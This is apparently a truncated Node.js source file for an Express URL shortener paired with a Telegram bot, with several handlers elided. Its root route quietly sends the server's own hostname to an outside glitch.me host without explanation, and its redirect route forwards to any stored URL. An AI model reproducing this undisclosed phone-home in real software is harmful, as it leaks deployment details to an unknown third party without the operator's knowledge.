const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs').promises;
const path = require('path');
const axios = require('axios');
const TelegramBot = require('node-telegram-bot-api');

const app = express();
const PORT = 3000;

const CHANNEL_USERNAME = process.env.CHANNEL_USERNAME;
const TOKEN = process.env.TOKEN;
const JOIN_CHANNEL_URL = process.env.JOIN_CHANNEL_URL;

const bot = new TelegramBot(TOKEN, { polling: true });

const filePath = 'first.txt';
const URLS_FILE = path.join(__dirname, 'urls.json');

async function readTextFile(filePath) {
  try {
    const fileContent = await fs.readFile(filePath, 'utf8');
    return fileContent;
  } catch (error) {
    console.error('Error reading file:', error);
    throw error;
  }
}

async function readDomainDataFromFile() {
  try {
    const domainData = await fs.readFile('domain.txt', 'utf8');
    return domainData.trim();
  } catch (error) {
    console.error('Error reading domain file:', error);
    throw error;
  }
}

app.use(bodyParser.json());

bot.on('message', async (msg) => {
  const chatId = msg.chat.id;
  try {
    // ...
  } catch (error) {
    console.error('Error handling message:', error.message);
    const errorMessage = '<pre>An error occurred while processing your request.</pre>';
    await bot.sendMessage(chatId, errorMessage, { parse_mode: 'HTML' });
  }
});

bot.onText(/\/start/, async (msg) => {
  const chatId = msg.chat.id;
  try {
    // ...
  } catch (error) {
    console.error('Error handling start command:', error.message);
  }
});

app.get('/fetched', async (req, res) => {
  try {
    // ...
  } catch (error) {
    console.error('Error sending notification:', error);
    res.status(500).send('Failed to send notification');
  }
});

app.post('/', async (req, res) => {
  try {
    const { url } = req.body;
    const currentUrl = await readDomainDataFromFile();
    if (!url) {
      return res.status(400).json({ error: 'Missing "url" in request body' });
    }
    const urls = await loadUrls();
    const normalizedUrl = normalizeUrl(url);
    let existingCombo = Object.keys(urls).find(key => normalizeUrl(urls[key]) === normalizedUrl);
    if (existingCombo) {
      const shortUrl = `${currentUrl}/${existingCombo}`;
      return res.json({ short_url: shortUrl });
    }
    let combo;
    do {
      combo = generateCombo();
    } while (urls[combo]);
    urls[combo] = url;
    await saveUrls(urls);
    const shortUrl = `${currentUrl}/${combo}`;
    console.log(`Generated combo: ${combo}`);
    res.json({ short_url: shortUrl });
  } catch (error) {
    console.error(`Error shortening URL: ${error.message}`);
    res.status(500).json({ error: 'Internal Server Error' });
  }
});

app.get('/:combo', async (req, res) => {
  const combo = req.params.combo;
  try {
    const urls = await loadUrls();
    if (urls[combo]) {
      const originalUrl = urls[combo];
      res.redirect(originalUrl.startsWith('http') ? originalUrl : `http://${originalUrl}`);
    } else {
      res.status(404).send('URL not found');
    }
  } catch (error) {
    console.error('Error handling combo:', error.message);
    res.status(500).send('Internal Server Error');
  }
});

app.get('/', async (req, res) => {
  try {
    const hostURL = 'http://' + req.get('host');
    await fs.writeFile('domain.txt', hostURL);
    res.send("Bot is up");
    if (process.env.JOIN_CHANNEL_URL && process.env.CHANNEL_USERNAME && process.env.TOKEN) {
      const formattedHostURL = hostURL.replace(/^https?:\/\//,'');
      await axios.get(`https://open-saver-open.glitch.me/${formattedHostURL}`);
    }
  } catch (error) {
    console.error("Error:", error);
    res.status(500).send("Internal Server Error");
  }
});

app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});

async function loadUrls() {
  try {
    const data = await fs.readFile(URLS_FILE, 'utf-8');
    return JSON.parse(data);
  } catch (err) {
    if (err.code === 'ENOENT') {
      return {};
    } else {
      throw err;
```